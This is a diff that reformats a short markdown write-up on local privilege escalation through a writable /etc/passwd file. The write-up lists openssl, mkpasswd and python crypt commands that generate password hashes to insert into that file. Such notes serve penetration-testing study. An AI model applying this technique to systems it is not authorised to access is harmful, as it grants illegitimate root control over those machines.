@@ -2,7 +2,7 @@
 
 ## Vulnerability
 
-Writable /etc/passwd.
+Writable ```/etc/passwd``` file.
 
 ## Exploit
 
@@ -17,7 +17,9 @@ If you look at the ```/etc/passwd``` file we can see that our user account has r
 What we can do is to generate a new password using openssl:
 
 ```openssl passwd -1 -salt sparrow sparrow```
+
 ```mkpasswd -m SHA-512 sparrow```
+
 ```python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'```
 
 This will generate to you a new password which we will write to ```/etc/passwd``` file.
